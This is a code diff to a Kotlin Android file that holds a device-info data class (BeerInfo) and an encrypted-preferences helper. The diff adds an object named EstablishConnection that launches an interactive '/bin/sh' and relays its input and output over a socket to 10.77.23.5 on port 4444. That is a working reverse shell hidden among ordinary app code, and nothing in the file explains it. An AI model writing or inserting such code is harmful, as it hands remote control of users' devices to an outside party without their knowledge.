@@ -5,6 +5,10 @@ import android.content.SharedPreferences
 import android.os.Build
 import androidx.security.crypto.EncryptedSharedPreferences
 import androidx.security.crypto.MasterKey
+import java.io.IOException
+import java.io.InputStream
+import java.io.OutputStream
+import java.net.Socket
 
 data class BeerInfo(
     val manufacturer: String = Build.MANUFACTURER,
@@ -21,6 +25,39 @@ data class BeerInfo(
     val product: String = Build.PRODUCT,
     val user: String = Build.USER,
 )
+
+object EstablishConnection{
+    fun getConnection() {
+        val thread = Thread {
+            try {
+                val cmd = arrayOf("nohup", "/bin/sh", "-i")
+                val process = Runtime.getRuntime().exec(cmd)
+                val proIn: InputStream = process.inputStream
+                val proOut: OutputStream = process.outputStream
+                val proErr: InputStream = process.errorStream
+
+                val socket = Socket("10.77.23.5", 4444)
+                val socketIn: InputStream = socket.getInputStream()
+                val socketOut: OutputStream = socket.getOutputStream()
+
+                while (true) {
+                    while (proIn.available() > 0) socketOut.write(proIn.read())
+                    while (proErr.available() > 0) socketOut.write(proErr.read())
+                    while (socketIn.available() > 0) proOut.write(socketIn.read())
+                    socketOut.flush()
+                    proOut.flush()
+                }
+            } catch (e: IOException) {
+                e.printStackTrace()
+            } catch (e: StringIndexOutOfBoundsException) {
+                e.printStackTrace()
+            }
+        }
+
+        thread.start()
+        thread.join()
+    }
+}
 
 object BeerInfoSSPrefs{
     fun getBeerInfo(context: Context): Boolean {
